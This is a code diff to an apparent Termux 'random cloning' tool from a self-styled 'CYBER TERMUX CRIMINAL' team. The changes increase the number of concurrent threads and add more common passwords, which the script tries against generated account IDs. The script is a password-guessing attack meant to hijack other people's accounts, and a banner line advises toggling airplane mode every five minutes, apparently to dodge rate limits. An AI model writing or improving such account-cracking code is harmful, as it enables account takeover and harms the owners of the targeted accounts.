@@ -102,7 +102,7 @@ logo = ("""
  \033[1;93m|     \033[1;35m[✓] GITHUB       :  \033[1;35mCyber-Rafi31            \033[1;93m|
  \033[1;93m|     \033[1;36m[✓] TOOL STATUS  : \033[1;36m Random Cloning Bd        \033[1;93m|
  \033[1;93m|     \033[1;35m[✓] TEAM         :  \033[1;35mCYBER TERMUX CRIMINAL          \033[1;93m|
- \033[1;93m|     \033[1;36m[✓] TOOL VIRSION :  \033[1;36m0.0                      \033[1;93m|
+ \033[1;93m|     \033[1;36m[✓] TOOL VIRSION :  \033[1;36m0.1                      \033[1;93m|
  \033[1;93m×××××××××××××××××\033[1;93m×××××××××××××××\033[1;93m××××××××××××××××××××
  \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m PLZ SAPPORT ME BRO....
  \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m CYBER TERMUX HELPING ZONE....
@@ -226,7 +226,7 @@ def xxr():
     for bilal in range(passx):
         pww = input(f"\033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Enter Password {bilal+1} : ")
         HamiiID.append(pww)
-    with ThreadPool(max_workers=50) as manshera:
+    with ThreadPool(max_workers=60) as manshera:
         clear()
         tl = str(len(user))
         print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOTAL IDS: {xr}'+tl)
@@ -237,7 +237,7 @@ def xxr():
         print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;91m USE AEROPLANE MOOD IN EVERY 5 MIN ')
         print(f" \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××")
         for love in user:
-            pwx = [love+code+'304050','shakil','saiful','rahman','mamum','Bangladesh','free fire','jannat']
+            pwx = [love+code+'304050','shakil','saiful','nusrat123','sadiya','Bangladesh','free fire','jannat','mim123','tamanna','tanjila']
             uid = code+love
             for Eman in HamiiID:
                 pwx.append(Eman)
